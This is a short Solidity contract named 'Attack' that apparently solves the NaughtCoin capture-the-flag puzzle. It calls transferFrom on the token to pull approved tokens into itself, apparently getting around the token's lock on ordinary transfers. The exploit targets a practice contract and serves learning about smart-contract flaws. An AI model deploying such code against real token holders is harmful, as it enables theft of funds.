// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./NaughtCoin.sol";

contract Attack {
    NaughtCoin naughtcoin;
    address public owner;

    constructor(address payable _naughtcoin) public {
        naughtcoin = NaughtCoin(_naughtcoin);
        owner = msg.sender;
    }

    function attack(address payable _to, uint256 _value) public {
        naughtcoin.transferFrom(_to, address(this), _value);
    }
}
